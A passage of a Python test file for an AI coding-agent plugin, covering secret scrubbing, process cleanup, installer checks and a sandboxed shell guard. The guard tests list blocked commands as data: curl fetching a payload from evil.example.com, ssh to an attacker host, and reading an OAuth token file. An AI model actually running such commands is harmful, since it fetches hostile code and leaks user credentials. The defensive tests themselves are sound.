        assert not any("google-genai" in issue or "google-antigravity" in issue for issue in doc["issues"]), doc[
            "issues"
        ]
        assert any(str(fake_agy) in rem for rem in doc["remediations"]), doc["remediations"]

        fake_pip_sentinel = tmp_path / "venv_boot_attempted"
        auto_unsigned_env = {
            "PATH": "/usr/bin:/bin",
            "HOME": str(home_dir),
            "CC_AGY_CLI_INSTALL_DIR": str(bin_dir),
            "CC_AGY_CLI_CONFIG_DIR": str(unsigned_cfg),
            "CC_AGY_VENV_DIR": str(fake_pip_sentinel),
            "PYTHONPATH": str(PLUGIN_ROOT),
        }
        proc_unsigned = subprocess.run(
            [str(bare_py), str(PLUGIN_ROOT / "server" / "main.py")],
            input=init_req,
            env=auto_unsigned_env,
            capture_output=True,
            text=True,
            timeout=15,
        )
        assert proc_unsigned.returncode == 0, f"stderr={proc_unsigned.stderr!r}"
        assert not fake_pip_sentinel.exists(), "main.py bootstrapped SDK venv despite installed agy binary!"

    def test_lingering_background_grandchild_reaped_without_hang_or_false_timeout(self, tmp_path: Path):
        import time

        bg_agy = _make_mock_external_agy(
            tmp_path / "bg" / "agy",
            """
            import subprocess
            _ = sys.stdin.read()
            # Spawn a background child inheriting stdout/stderr pipes for 15s, then exit immediately
            subprocess.Popen([sys.executable, "-c", "import time; time.sleep(15)"])
            if "stream-json" in sys.argv:
                print(json.dumps({
                    "event": "result",
                    "result": {
                        "status": "DONE",
                        "conversation_id": "conv-bg",
                        "num_turns": 1,
                        "response": "done cleanly",
                        "usage": {"input_tokens": 25, "output_tokens": 5},
                    },
                }), flush=True)
            else:
                print(json.dumps({
                    "status": "DONE",
                    "response": "ask done cleanly",
                    "usage": {"input_tokens": 15, "output_tokens": 5},
                }), flush=True)
            raise SystemExit(0)
            """,
        )
        cfg = tmp_path / "cfg"
        cfg.mkdir()
        (cfg / "antigravity-oauth-token").write_text("oauth-tok-bg", encoding="utf-8")
        env = {"CC_AGY_CLI_BIN": str(bg_agy), "CC_AGY_CLI_CONFIG_DIR": str(cfg)}

        t0 = time.monotonic()
        w_out = run_agy_cli_worker(
            {"workspace_dir": str(tmp_path), "prompt": "run bg", "timeout_seconds": 3.0, "env": env}
        )
        elapsed_w = time.monotonic() - t0
        assert w_out["text"] == "done cleanly"
        assert elapsed_w < 3.0, f"Worker hung waiting on grandchild pipe ({elapsed_w:.2f}s)"

        t1 = time.monotonic()
        a_out = run_agy_cli_ask({"prompt": "ask bg", "timeout_seconds": 3.0, "env": env})
        elapsed_a = time.monotonic() - t1
        assert a_out["text"] == "ask done cleanly"
        assert elapsed_a < 3.0, f"Ask hung waiting on grandchild pipe ({elapsed_a:.2f}s)"

    def test_full_secret_env_scrubbing_matches_verify_policy(self):
        from server.verify import SECRET_ENV_KEYS

        raw_env = {k: f"secret-val-for-{k}" for k in SECRET_ENV_KEYS}
        raw_env["CLOUDSDK_AUTH_ACCESS_TOKEN"] = "".join(("ya29", ".dummy-gcloud-test"))
        raw_env["GOOGLE_GENAI_USE_VERTEXAI"] = "true"
        raw_env["CC_AGY_VERTEX_BASE_URL"] = "https://gw.internal"
        raw_env["GOOGLE_VERTEX_BASE_URL"] = "https://gw2.internal"
        raw_env["ANTIGRAVITY_OAUTH_TOKEN"] = "keep-explicit-agy-oauth"
        raw_env["PATH"] = "/usr/bin:/bin"

        scrubbed = build_agy_subprocess_env(raw_env)
        for key in SECRET_ENV_KEYS:
            if key == "ANTIGRAVITY_OAUTH_TOKEN":
                assert scrubbed.get(key) == "keep-explicit-agy-oauth"
            else:
                assert key not in scrubbed, f"Secret key {key} leaked into agy subprocess env!"
        for extra in ("CLOUDSDK_AUTH_ACCESS_TOKEN", "GOOGLE_GENAI_USE_VERTEXAI", "CC_AGY_VERTEX_BASE_URL", "GOOGLE_VERTEX_BASE_URL"):
            assert extra not in scrubbed, f"{extra} leaked into agy subprocess env!"

    def test_auth_classifier_negatives_and_quota_precedence(self, tmp_path: Path):
        from server.writers import WriterTransportError

        assert is_agy_auth_error("Processed 403 files successfully") is False
        assert is_agy_auth_error("IndexError at line 401 of parser.py") is False
        assert is_agy_auth_error("oauth token refreshed; quota exhausted 429") is False
        assert is_agy_auth_error("PermissionError: [Errno 13] Permission denied: 'readonly.py'") is False

        assert is_agy_auth_error("HTTP 401 Unauthorized") is True
        assert is_agy_auth_error("RPC failed: status = 403") is True
        assert is_agy_auth_error("Not logged in. Please sign in with Google.") is True

        quota_bin = _make_mock_external_agy(
            tmp_path / "quota" / "agy",
            """
            _ = sys.stdin.read()
            print(json.dumps({"status": "ERROR", "error": "oauth token refreshed; quota exhausted 429"}), flush=True)
            raise SystemExit(1)
            """,
        )
        dummy_req = WriterRequest(
            task=FileTask(task_id="t1", path="a.py", action="create", intent="create a.py"),
            prompt="hello",
        )
        with mock.patch.dict(os.environ, {"CC_AGY_CLI_BIN": str(quota_bin)}, clear=False):
            w_quota = make_genai_writer({"auth_mode": "gemini_enterprise"}, model="gemini-3.8-flash")
            with pytest.raises(WriterTransportError):
                w_quota(dummy_req)

    def test_stream_json_parallel_tools_and_text_dedup(self, tmp_path: Path):
        fake_agy = _make_mock_external_agy(
            tmp_path / "stream" / "agy",
            """
            _ = sys.stdin.read()
            events = [
                {"event": "step_update", "step_update": {"conversation_id": "conv-1", "text_delta": "Hello ", "tool_info": {"name": "view_file", "parameters": {"path": "a.py"}}}},
                {"event": "step_update", "step_update": {"conversation_id": "conv-1", "text_delta": "world", "tool_info": {"name": "edit_file", "parameters": {"path": "a.py"}}}},
                {"type": "assistant", "message": {"content": [
                    {"type": "thinking", "thinking": "checking a.py"},
                    {"type": "tool_use", "name": "view_file", "input": {"path": "a.py"}},
                    {"type": "tool_use", "name": "edit_file", "input": {"path": "a.py"}},
                    {"type": "text", "text": "Hello world"},
                ]}},
                {"event": "result", "result": {"status": "DONE", "conversation_id": "conv-1", "num_turns": 1, "usage": {"input_tokens": 10, "output_tokens": 5}}},
            ]
            for e in events:
                print(json.dumps(e), flush=True)
            """,
        )
        cfg = tmp_path / "cfg"
        cfg.mkdir()
        res = run_agy_cli_worker(
            {"workspace_dir": str(tmp_path), "prompt": "test", "env": {"CC_AGY_CLI_BIN": str(fake_agy), "CC_AGY_CLI_CONFIG_DIR": str(cfg)}}
        )
        assert res["tool_calls"] == [
            {"name": "view_file", "args": {"path": "a.py"}},
            {"name": "edit_file", "args": {"path": "a.py"}},
        ]
        assert res["text"] == "Hello world"

    def test_multiturn_timeout_and_error_preserve_prior_usage_and_resume_delta(self, tmp_path: Path):
        cfg = tmp_path / "cfg"
        cfg.mkdir()
        (cfg / "antigravity-oauth-token").write_text("tok", encoding="utf-8")

        to_bin = _make_mock_external_agy(
            tmp_path / "to" / "agy",
            """
            import time
            _ = sys.stdin.read()
            if "--conversation" not in sys.argv:
                print(json.dumps({"type": "assistant", "message": {"content": [{"type": "thinking", "thinking": "T1 thought"}]}}), flush=True)
                print(json.dumps({"event": "step_update", "step_update": {"step_index": 1, "conversation_id": "conv-t1", "tool_info": {"name": "view_file", "parameters": {"path": "x.py"}}}}), flush=True)
                print(json.dumps({"event": "result", "result": {"status": "DONE", "conversation_id": "conv-t1", "num_turns": 1, "response": "T1", "usage": {"input_tokens": 400, "output_tokens": 100}}}), flush=True)
            else:
                time.sleep(5.0)
            """,
        )
        with pytest.raises(TimeoutError) as to_info:
            run_agy_cli_worker(
                {
                    "workspace_dir": str(tmp_path),
                    "prompts": ["Turn 1", "Turn 2"],
                    "timeout_seconds": 0.35,
                    "env": {"CC_AGY_CLI_BIN": str(to_bin), "CC_AGY_CLI_CONFIG_DIR": str(cfg)},
                }
            )
        assert to_info.value.partial_usage["prompt_token_count"] == 400  # type: ignore[attr-defined]
        assert len(to_info.value.partial_tool_calls) == 1  # type: ignore[attr-defined]
        assert to_info.value.partial_thoughts == ["T1 thought"]  # type: ignore[attr-defined]
        assert to_info.value.partial_agy_conversation_id == "conv-t1"  # type: ignore[attr-defined]

        err_bin = _make_mock_external_agy(
            tmp_path / "err" / "agy",
            """
            _ = sys.stdin.read()
            if "--conversation" not in sys.argv:
                print(json.dumps({"event": "result", "result": {"status": "DONE", "conversation_id": "conv-4", "num_turns": 1, "response": "T1", "usage": {"input_tokens": 400, "output_tokens": 100}}}), flush=True)
            else:
                print(json.dumps({"event": "result", "result": {"status": "ERROR", "is_error": True, "error": "rate limit on turn 2", "conversation_id": "conv-4", "num_turns": 2, "usage": {"input_tokens": 0, "output_tokens": 0}}}), flush=True)
                raise SystemExit(1)
            """,
        )
        with pytest.raises(RuntimeError) as err_info:
            run_agy_cli_worker(
                {
                    "workspace_dir": str(tmp_path),
                    "prompts": ["Turn 1", "Turn 2"],
                    "env": {"CC_AGY_CLI_BIN": str(err_bin), "CC_AGY_CLI_CONFIG_DIR": str(cfg)},
                }
            )
        assert err_info.value.partial_usage["prompt_token_count"] == 400  # type: ignore[attr-defined]

        # Single-prompt `--conversation` resume with `prior_agy_usage` computes delta rather than double-counting
        res_bin = _make_mock_external_agy(
            tmp_path / "res" / "agy",
            """
            _ = sys.stdin.read()
            print(json.dumps({"event": "result", "result": {"status": "DONE", "conversation_id": "conv-prev", "num_turns": 2, "response": "resumed", "usage": {"input_tokens": 1000, "output_tokens": 250}}}), flush=True)
            """,
        )
        res_out = run_agy_cli_worker(
            {
                "workspace_dir": str(tmp_path),
                "prompt": "Follow up",
                "agy_conversation_id": "conv-prev",
                "prior_agy_usage": {"prompt_token_count": 400, "candidates_token_count": 100, "total_token_count": 500},
                "env": {"CC_AGY_CLI_BIN": str(res_bin), "CC_AGY_CLI_CONFIG_DIR": str(cfg)},
            }
        )
        assert res_out["usage"]["prompt_token_count"] == 600
        assert res_out["usage"]["candidates_token_count"] == 150

    def test_composed_schema_model_and_effort_retries(self, tmp_path: Path):
        from server.agy_cli import _MODEL_FALLBACK_CACHE

        cfg = tmp_path / "cfg"
        cfg.mkdir()
        (cfg / "antigravity-oauth-token").write_text("tok", encoding="utf-8")

        _MODEL_FALLBACK_CACHE.clear()
        agy_schema_then_model = _make_mock_external_agy(
            tmp_path / "sm" / "agy",
            """
            _ = sys.stdin.read()
            args = sys.argv[1:]
            if "--json-schema" in args:
                sys.stderr.write("error: unknown flag: --json-schema is not supported\\n")
                raise SystemExit(2)
            model = args[args.index("--model") + 1] if "--model" in args else ""
            if model == "gemini-3.8-flash":
                sys.stderr.write('Error: Model "gemini-3.8-flash" is not recognized as a known model.\\nAvailable models:\\n  Gemini 3 Flash\\n')
                raise SystemExit(1)
            print(json.dumps({"status": "DONE", "response": "{\\"ok\\": true}", "usage": {"input_tokens": 10, "output_tokens": 5}}))
            """,
        )
        txt, usage = run_agy_cli_structured_writer(
            prompt="p",
            system_instruction="s",
            json_schema={"type": "object"},
            model="gemini-3.8-flash",
            thinking_level="LOW",
            env={"CC_AGY_CLI_BIN": str(agy_schema_then_model), "CC_AGY_CLI_CONFIG_DIR": str(cfg)},
        )
        assert json.loads(txt) == {"ok": True}
        assert usage["prompt_token_count"] == 10

        _MODEL_FALLBACK_CACHE.clear()
        agy_model_then_effort = _make_mock_external_agy(
            tmp_path / "me" / "agy",
            """
            _ = sys.stdin.read()
            args = sys.argv[1:]
            model = args[args.index("--model") + 1] if "--model" in args else ""
            effort = args[args.index("--effort") + 1] if "--effort" in args else ""
            if model == "gemini-3.8-flash":
                sys.stderr.write('Error: Model "gemini-3.8-flash" is not recognized as a known model.\\nAvailable models:\\n  Gemini 3 Flash\\n')
                raise SystemExit(1)
            if effort:
                sys.stderr.write(f'Error: Model "{model}" has no "{effort}" effort\\n')
                raise SystemExit(1)
            print(json.dumps({"status": "DONE", "response": "OK_NO_EFFORT", "usage": {"input_tokens": 12, "output_tokens": 4}}))
            """,
        )
        ask_res = run_agy_cli_ask(
            {
                "prompt": "hi",
                "model": "gemini-3.8-flash",
                "thinking_level": "HIGH",
                "env": {"CC_AGY_CLI_BIN": str(agy_model_then_effort), "CC_AGY_CLI_CONFIG_DIR": str(cfg)},
            }
        )
        assert ask_res["text"] == "OK_NO_EFFORT"

    def test_installer_smoke_check_before_overwrite_and_http_manifest_url_rejected(self, tmp_path: Path):
        bin_dir = tmp_path / "bin"
        bin_dir.mkdir()
        existing_agy = bin_dir / "agy"
        existing_agy.write_text('#!/usr/bin/env bash\necho "Antigravity CLI 0.2.29 --output-format"\n', encoding="utf-8")
        existing_agy.chmod(0o755)

        tar_path = tmp_path / "bad-agy.tar.gz"
        broken = b"#!/usr/bin/env bash\nexit 1\n"
        with tarfile.open(tar_path, "w:gz") as tf:
            ti = tarfile.TarInfo("agy")
            ti.size = len(broken)
            ti.mode = 0o755
            tf.addfile(ti, io.BytesIO(broken))
        sha = hashlib.sha512(tar_path.read_bytes()).hexdigest()
        manifest = tmp_path / "latest.json"
        manifest.write_text(
            json.dumps({"version": "0.2.30", "url": f"file://{tar_path}", "sha512": sha}),
            encoding="utf-8",
        )
        proc = subprocess.run(
            ["bash", str(INSTALL_SCRIPT), "--target-dir", str(bin_dir), "--manifest-url", f"file://{manifest}"],
            capture_output=True,
            text=True,
        )
        assert proc.returncode != 0
        assert existing_agy.exists(), "Failed upgrade deleted existing working agy binary!"
        assert "0.2.29" in existing_agy.read_text(encoding="utf-8")

        http_proc = subprocess.run(
            ["bash", str(INSTALL_SCRIPT), "--target-dir", str(bin_dir), "--manifest-url", "http://127.0.0.1:9/latest.json"],
            capture_output=True,
            text=True,
        )
        assert http_proc.returncode != 0
        assert "https://" in http_proc.stderr

        assert (PLUGIN_ROOT / "scripts" / "__init__.py").is_file()

    def test_interactive_wizard_auth_precedence_and_manifest_emdash_hygiene(self, tmp_path: Path):
        from server.install import run_interactive_wizard

        home = tmp_path / "home"
        agy = home / ".local" / "share" / "cc-agy-plugin" / "bin" / "agy"
        agy.parent.mkdir(parents=True)
        _make_mock_external_agy(agy, "raise SystemExit(0)")
        cfg = home / ".gemini" / "antigravity-cli"
        cfg.mkdir(parents=True)
        (cfg / "antigravity-oauth-token").write_text("oauth-token-123456", encoding="utf-8")

        # When GEMINI_API_KEY is set and CC_AGY_AUTH_MODE is unset, wizard must default to api_key (NOT override with gemini-enterprise)
        defaults = iter(["", "", "", ""])
        built = run_interactive_wizard(
            input_fn=lambda _p: next(defaults),
            output_fn=lambda _m: None,
            env={"HOME": str(home), "GEMINI_API_KEY": "present"},
        )
        assert "--auth" not in built, built

        # When no key/project/gateway is set and signed-in agy exists under HOME, wizard defaults to gemini-enterprise
        defaults_ent = iter(["", "", "", ""])
        built_ent = run_interactive_wizard(
            input_fn=lambda _p: next(defaults_ent),
            output_fn=lambda _m: None,
            env={"HOME": str(home), "PATH": "/usr/bin:/bin"},
        )
        assert built_ent[built_ent.index("--auth") + 1] == "gemini-enterprise"

        codex_manifest = json.loads(
            (PLUGIN_ROOT / "plugins" / "cc-agy-plugin" / ".codex-plugin" / "plugin.json").read_text(encoding="utf-8")
        )
        assert "Gemini Enterprise" in codex_manifest["description"]
        codex_skill = (PLUGIN_ROOT / "plugins" / "cc-agy-plugin" / "skills" / "vertex" / "SKILL.md").read_text(
            encoding="utf-8"
        )
        assert "agy CLI" in codex_skill.splitlines()[2]

        for rel in (
            "README.md",
            "skills/vertex/SKILL.md",
            "plugins/cc-agy-plugin/skills/vertex/SKILL.md",
            "commands/doctor.md",
            "server/agy_cli.py",
            "server/agy_runner.py",
            "server/jobs.py",
            "scripts/pre_tool_guard.py",
        ):
            content = (PLUGIN_ROOT / rel).read_text(encoding="utf-8")
            assert "—" not in content, f"Em-dash found in {rel}"


class TestExternalAgentFeedbackFixes:
    """RED-first regression tests for macOS /proc-less cleanup, SQLite schema bounds,
    spec/traceback dictation precision, and native sandbox + shell guardrails."""

    def test_macos_procless_process_tree_cleanup_escalates_sigkill_and_kills_grandchildren(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        import server.agy_runner as agy_runner

        # Force the /proc-less Darwin/BSD fallback path even when running on Linux
        monkeypatch.setattr(agy_runner, "_proc_fs_available", lambda: False, raising=False)
        # Also shadow Path("/proc").is_dir in case the implementation hasn't added _proc_fs_available yet
        orig_is_dir = Path.is_dir
        monkeypatch.setattr(
            Path,
            "is_dir",
            lambda self: False if str(self) == "/proc" else orig_is_dir(self),
        )

        save_dir = tmp_path / "save_macos"
        save_dir.mkdir()
        grandchild_pid_file = tmp_path / "grandchild.pid"

        pre = agy_runner._direct_child_pids(os.getpid())
        parent_proc = subprocess.Popen(
            [
                sys.executable,
                "-c",
                textwrap.dedent(
                    f"""
                    import pathlib, signal, subprocess, sys, time
                    signal.signal(signal.SIGTERM, signal.SIG_IGN)
                    gc = subprocess.Popen([sys.executable, "-c", "import signal, time; signal.signal(signal.SIGTERM, signal.SIG_IGN); time.sleep(30)"])
                    pathlib.Path({str(grandchild_pid_file)!r}).write_text(str(gc.pid), encoding="utf-8")
                    time.sleep(30)
                    """
                ),
            ],
            env={**os.environ, "CC_AGY_HARNESS_SAVE_DIR": str(save_dir)},
        )
        try:
            deadline = time.monotonic() + 5.0
            while not grandchild_pid_file.is_file() and time.monotonic() < deadline:
                time.sleep(0.05)
            assert grandchild_pid_file.is_file(), "Grandchild PID file was not written"
            gc_pid = int(grandchild_pid_file.read_text(encoding="utf-8").strip())

            # Verify /proc-less helpers see live child, grandchild, and liveness
            assert parent_proc.pid in agy_runner._direct_child_pids(os.getpid())
            assert gc_pid in agy_runner._collect_descendant_pids({parent_proc.pid}, exclude_pid=os.getpid())
            assert agy_runner._pid_is_alive_non_zombie(parent_proc.pid) is True
            assert agy_runner._pid_is_alive_non_zombie(gc_pid) is True

            # Pass an opaque object() with ZERO private SDK attributes (_conversation/_strategy/_process)
            killed = agy_runner._force_terminate_agent_process(
                object(),
                str(save_dir),
                pre_child_pids=pre,
            )
            assert killed >= 2
            parent_proc.wait(timeout=2.0)
            # Reap or confirm grandchild is dead
            wait_end = time.monotonic() + 2.0
            while agy_runner._pid_is_alive_non_zombie(gc_pid) and time.monotonic() < wait_end:
                time.sleep(0.05)
            assert agy_runner._pid_is_alive_non_zombie(gc_pid) is False
        finally:
            for p_id in (parent_proc.pid,):
                try:
                    os.kill(p_id, 9)
                except OSError:
                    pass
            try:
                parent_proc.wait(timeout=1.0)
            except Exception:
                pass

    def test_sqlite_telemetry_rejects_refactored_proto_nanosecond_varints_and_schema_drift(
        self, tmp_path: Path
    ):
        import sqlite3
        from server.agy_runner import extract_sqlite_session_telemetry

        def _encode_varint(n: int) -> bytes:
            out = bytearray()
            while n >= 0x80:
                out.append((n & 0x7F) | 0x80)
                n >>= 7
            out.append(n)
            return bytes(out)

        save_dir = tmp_path / "save_corrupt"
        save_dir.mkdir()
        db_path = save_dir / "session.db"
        conn = sqlite3.connect(str(db_path))
        conn.execute("CREATE TABLE steps (idx INTEGER, step_type INTEGER, metadata BLOB, step_payload BLOB)")
        # Simulate localharness repurposing field 2 inside field 9 for a 64-bit nanosecond epoch timestamp
        ns_epoch = 1_792_728_000_000_000_000
        inner = (b"\x10" + _encode_varint(ns_epoch))  # tag (2 << 3 | 0) = 0x10
        outer = (b"\x4a" + _encode_varint(len(inner)) + inner)  # tag (9 << 3 | 2) = 0x4a
        conn.execute("INSERT INTO steps VALUES (1, 15, ?, ?)", (outer, b""))
        conn.commit()
        conn.close()

        tel = extract_sqlite_session_telemetry(save_dir)
        assert tel["total_token_count"] == 0
        assert tel["requests"] == []

    def test_lint_delegation_prompt_allows_json_yaml_sql_and_tracebacks_while_blocking_smuggled_code(self):
        from scripts.pre_tool_guard import lint_delegation_prompt

        json_fixture_prompt = (
            "Ensure `POST /v1/orders` returns this exact error schema:\n"
            "```json\n"
            "{\n"
            '  "error": {\n'
            '    "code": "INVALID_LINE_ITEM",\n'
            '    "http_status": 422,\n'
            '    "retryable": false,\n'
            '    "details": [\n'
            '      {"field": "quantity", "reason": "must_be_positive"},\n'
            '      {"field": "sku", "reason": "unknown_catalog_id"}\n'
            "    ],\n"
            '    "request_id": "req_123"\n'
            "  }\n"
            "}\n"
            "```\n"
        )
        assert lint_delegation_prompt(json_fixture_prompt)["ok"] is True

        unfenced_json_prompt = (
            "Match this fixture payload:\n"
            "{\n"
            '  "alpha": 1,\n'
            '  "beta": 2,\n'
            '  "gamma": 3,\n'
            '  "delta": 4,\n'
            '  "epsilon": 5,\n'
            '  "zeta": 6,\n'
            '  "eta": 7,\n'
            '  "theta": 8,\n'
            '  "iota": 9\n'
            "}\n"
        )
        assert lint_delegation_prompt(unfenced_json_prompt)["ok"] is True

        yaml_spec_prompt = (
            "Support parsing this YAML config structure:\n"
            "```yaml\n"
            "service:\n"
            "  name: billing-worker\n"
            "  replicas: 3\n"
            "  timeouts:\n"
            "    connect_ms: 500\n"
            "    read_ms: 2500\n"
            "  retries:\n"
            "    max_attempts: 4\n"
            "    backoff_ms: 200\n"
            "  metrics:\n"
            "    enabled: true\n"
            "```\n"
        )
        assert lint_delegation_prompt(yaml_spec_prompt)["ok"] is True

        sql_schema_prompt = (
            "Fix the migration against this table schema:\n"
            "```sql\n"
            "CREATE TABLE ledger_entries (\n"
            "  id BIGSERIAL PRIMARY KEY,\n"
            "  account_id UUID NOT NULL,\n"
            "  amount_cents BIGINT NOT NULL,\n"
            "  currency CHAR(3) NOT NULL,\n"
            "  direction VARCHAR(16) NOT NULL,\n"
            "  reference_id VARCHAR(128),\n"
            "  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),\n"
            "  settled_at TIMESTAMPTZ,\n"
            "  UNIQUE (account_id, reference_id)\n"
            ");\n"
            "```\n"
        )
        assert lint_delegation_prompt(sql_schema_prompt)["ok"] is True

        traceback_prompt = (
            "Fix the crash shown in this bug report:\n"
            "Traceback (most recent call last):\n"
            '  File "/app/server/routes.py", line 41, in create_invoice\n'
            "    total = compute_invoice_total(payload)\n"
            '  File "/app/server/billing.py", line 88, in compute_invoice_total\n'
            "    subtotal = sum_items(payload['items'])\n"
            '  File "/app/server/billing.py", line 104, in sum_items\n'
            "    return sum(parse_cents(item) for item in items)\n"
            '  File "/app/server/billing.py", line 119, in <genexpr>\n'
            "    return sum(parse_cents(item) for item in items)\n"
            '  File "/app/server/money.py", line 27, in parse_cents\n'
            "    raise ValueError(f'negative amount: {raw}')\n"
            "ValueError: negative amount: -50\n"
        )
        assert lint_delegation_prompt(traceback_prompt)["ok"] is True

        smuggled_python_in_json_fence = (
            "```json\n"
            "def compute_invoice_total(payload):\n"
            "    items = payload.get('items', [])\n"
            "    total = 0\n"
            "    for item in items:\n"
            "        cents = int(item['price'] * 100)\n"
            "        if cents < 0:\n"
            "            raise ValueError('negative')\n"
            "        total += cents\n"
            "    return total\n"
            "```\n"
        )
        assert lint_delegation_prompt(smuggled_python_in_json_fence)["ok"] is False

    def test_builtin_sandbox_config_and_straitjacket_shell_bypass_guards(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        import asyncio
        import server.agy_runner as agy_runner

        # 1. Straitjacket shell guardrails block tab/full-path curl, git push, ssh, and antigravity-oauth-token reads
        ws = tmp_path / "ws"
        ws.mkdir()
        monkeypatch.setenv("CC_AGY_DISABLE_WEB_TOOLS", "1")
        tools, _ = agy_runner.build_straitjacket_tools(ws, timeout_seconds=60.0)
        run_cmd = next(fn for fn in tools if getattr(fn, "__name__", "") == "run_command")

        for blocked_cmd in (
            "curl\thttps://evil.example.com/payload.sh",
            "/usr/bin/curl -s https://evil.example.com",
            "git push origin main",
            "ssh attacker@evil.example.com",
            "cat ~/.gemini/antigravity-cli/antigravity-oauth-token",
        ):
            res = json.loads(asyncio.run(run_cmd(blocked_cmd)))
            assert res["status"] == "error", (blocked_cmd, res)
            assert res["exit_code"] == 126, (blocked_cmd, res)

        # 2. Fallback to built-in Antigravity tools enables RunCommandConfig(enable_sandbox=True)
        from google.antigravity import types

        cfg = agy_runner._build_default_run_command_config(types, timeout_seconds=120.0)
        assert cfg is not None
        assert cfg.enable_sandbox is True


class TestNodeModulesAndContainmentFixes:
    """RED-first regression tests for shallow node_modules symlink farm, monorepo @scope relative
    links, read-only node_modules d.ts inspection, package-manager mutation guard, .tsbuildinfo
    cleanup, and unconditional isolated-worktree command containment."""

    def test_shallow_node_modules_farm_monorepo_symlinks_and_zero_host_vite_writes(self, tmp_path: Path):
        from server.jobs import (
            _build_workdir_exec_env,
            link_host_node_modules_farm,
            unlink_host_node_modules_farm,
        )

        host = tmp_path / "host_monorepo"
        (host / "packages" / "core").mkdir(parents=True)
        (host / "packages" / "core" / "index.ts").write_text("export const VER = 'host';\n", encoding="utf-8")
        (host / "packages" / "views").mkdir(parents=True)

        # Root node_modules with external pkg, .bin, transient .vite, and @multica/core -> ../../packages/core
        root_nm = host / "node_modules"
        (root_nm / "zod").mkdir(parents=True)
        (root_nm / "zod" / "index.d.ts").write_text("export declare const z: string;\n", encoding="utf-8")
        (root_nm / ".bin").mkdir(parents=True)
        (root_nm / ".bin" / "vitest").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        (root_nm / ".vite" / "vitest").mkdir(parents=True)
        (root_nm / ".vite" / "vitest" / "results.json").write_text('{"host":true}\n', encoding="utf-8")
        (root_nm / "@multica").mkdir(parents=True)
        os.symlink("../../packages/core", str(root_nm / "@multica" / "core"))

        # Subpackage node_modules with @multica/core -> ../../../core
        sub_nm = host / "packages" / "views" / "node_modules"
        (sub_nm / "@multica").mkdir(parents=True)
        os.symlink("../../../core", str(sub_nm / "@multica" / "core"))

        # Isolated worktree with edited packages/core/index.ts
        wt = tmp_path / "wt"
        (wt / "packages" / "core").mkdir(parents=True)
        (wt / "packages" / "core" / "index.ts").write_text("export const VER = 'worktree_edit';\n", encoding="utf-8")
        (wt / "packages" / "views").mkdir(parents=True)

        created = link_host_node_modules_farm(host, wt)
        assert len(created) == 2

        # 1. Transient .vite cache was NOT linked; writing wt/node_modules/.vite leaves host untouched
        assert not (wt / "node_modules" / ".vite").exists()
        (wt / "node_modules" / ".vite").mkdir(parents=True)
        (wt / "node_modules" / ".vite" / "local.json").write_text('{"wt":true}\n', encoding="utf-8")
        assert not (root_nm / ".vite" / "local.json").exists()

        # 2. Monorepo @multica/core resolves to WORKTREE packages/core, NOT host packages/core!
        assert (wt / "node_modules" / "@multica" / "core").resolve() == (wt / "packages" / "core").resolve()
        assert (
            (wt / "packages" / "views" / "node_modules" / "@multica" / "core").resolve()
            == (wt / "packages" / "core").resolve()
        )
        assert "worktree_edit" in (wt / "node_modules" / "@multica" / "core" / "index.ts").read_text(encoding="utf-8")

        # 3. PATH includes wt/node_modules/.bin in _build_workdir_exec_env and build_agy_subprocess_env
        exec_env = _build_workdir_exec_env(wt, {"PATH": "/usr/bin"})
        assert exec_env["PATH"].split(":")[0] == str((wt / "node_modules" / ".bin").resolve())
        cli_env = build_agy_subprocess_env({"PATH": "/usr/bin"}, cwd=wt)
        assert str((wt / "node_modules" / ".bin").resolve()) in cli_env["PATH"].split(":")

        # 4. Unlinking cleans wt farm completely while leaving host node_modules intact
        unlink_host_node_modules_farm(created)
        assert not (wt / "node_modules").exists()
        assert not (wt / "packages" / "views" / "node_modules").exists()
        assert (root_nm / "zod" / "index.d.ts").is_file()
        assert (root_nm / ".vite" / "vitest" / "results.json").is_file()

    def test_readonly_dts_access_pkg_manager_guard_tsbuildinfo_and_unconditional_containment(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        import asyncio
        import server.agy_runner as agy_runner
        from server.jobs import _is_ephemeral_build_or_test_artifact, link_host_node_modules_farm

        # Ensure disable_web_tools is FALSE so we verify unconditional isolated-worktree containment
        monkeypatch.setenv("CC_AGY_DISABLE_WEB_TOOLS", "0")
        monkeypatch.setenv("CC_AGY_STRICT_MODE", "0")

        host_repo = tmp_path / "ts_host_repo"
        (host_repo / "node_modules" / "zod").mkdir(parents=True)
        (host_repo / "node_modules" / "zod" / "index.d.ts").write_text(
            "export interface ZodType {\n  parse(input: unknown): any;\n}\n",
            encoding="utf-8",
        )
        (host_repo / "secret_host_only.txt").write_text("do-not-copy\n", encoding="utf-8")

        wt = tmp_path / "isolated_wt"
        wt.mkdir()
        link_host_node_modules_farm(host_repo, wt)

        tools, _ = agy_runner.build_straitjacket_tools(
            wt,
            timeout_seconds=60.0,
            profile="full",
            host_workspace_root=host_repo,
            nm_linked=True,
            isolated_worktree=True,
        )
        by_name = {getattr(fn, "__name__", ""): fn for fn in tools}

        # 1. Read-only view_file, list_dir, and search_dir work on linked node_modules/<pkg>/*.d.ts
        vf_out = asyncio.run(by_name["view_file"]("node_modules/zod/index.d.ts", 1, 20))
        assert "ZodType" in vf_out, vf_out
        ld_out = asyncio.run(by_name["list_dir"]("node_modules/zod"))
        assert "index.d.ts" in ld_out, ld_out
        sd_out = asyncio.run(by_name["search_dir"]("ZodType", "node_modules/zod"))
        assert "index.d.ts" in sd_out, sd_out

        # Reading outside workspace or host non-node_modules stays blocked
        esc_out = json.loads(asyncio.run(by_name["view_file"]("../ts_host_repo/secret_host_only.txt", 1, 10)))
        assert "PermissionDenied" in esc_out.get("error", ""), esc_out

        # 2. Mutating npm/pnpm/yarn/bun commands blocked when nm_linked=True, while test/typecheck pass
        for mut_cmd in ("npm ci", "npm install", "pnpm add zod", "yarn", "bun install", "rm -rf node_modules/zod"):
            res = json.loads(asyncio.run(by_name["run_command"](mut_cmd)))
            assert res["status"] == "error", (mut_cmd, res)
            assert "already linked" in res["error"], (mut_cmd, res)

        ok_test = json.loads(asyncio.run(by_name["run_command"]("echo npm test ok")))
        assert ok_test.get("command_exit_code", ok_test.get("exit_code")) == 0

        # 3. Unconditional isolated containment blocks `find /`, `cp -r <host_repo>`, and `ls ..`,
        #    while allowing `ls /tmp` per Manish's explicit trim!
        for esc_cmd in (
            "find / -name vitest 2>/dev/null",
